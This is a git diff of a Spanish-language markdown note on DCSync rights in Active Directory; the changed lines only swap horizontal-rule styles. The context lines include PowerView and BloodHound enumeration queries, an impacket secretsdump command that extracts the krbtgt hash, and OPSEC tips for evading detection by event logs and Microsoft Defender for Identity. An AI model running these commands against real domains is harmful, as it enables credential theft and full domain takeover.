@@ -16,7 +16,7 @@ linked:
 ---
 # DCSync - Permisos y Discovery
 
-***
+---
 
 ## ACEs requeridos
 
@@ -29,7 +29,7 @@ linked:
 
 **Necesitás ambos primeros GUIDs** sobre el naming context del dominio (`DC=corp,DC=local`).
 
-___
+---
 
 ## Holders por defecto
 
@@ -46,7 +46,7 @@ ___
 
 **Red flag:** `MSOL_*` accounts con DCSync generan muchos falsos positivos en MDI — usadas por Azure AD Connect legítimamente.
 
-___
+---
 
 ## Enumerar con PowerView
 
@@ -65,7 +65,7 @@ Get-ObjectAcl -DistinguishedName "DC=corp,DC=local" -ResolveGUIDs |
   Sort-Object IdentityReference
 ```
 
-___
+---
 
 ## Enumerar con BloodHound / Cypher
 
@@ -76,7 +76,7 @@ ___
 | `MATCH (n)-[:MemberOf*1..]->(g)-[:DCSync]->(d:Domain) RETURN n,g,d` | Indirecto via group | Nested memberships. |
 ^dcsync-perms-bloodhound
 
-___
+---
 
 ## Enumerar con impacket (test rápido)
 
@@ -91,7 +91,7 @@ ___
 impacket-secretsdump corp.local/svcuser:'P@ss'@dc01.corp.local -just-dc-user krbtgt
 ```
 
-___
+---
 
 ## OPSEC — consideraciones pre-ataque
 
@@ -104,4 +104,4 @@ ___
 | Alternativa file-based en DC | VSS + ntds.dit copy — no genera 4662 DCSync | Si tenés RCE en DC |
 ^dcsync-perms-opsec
 
-***
+---
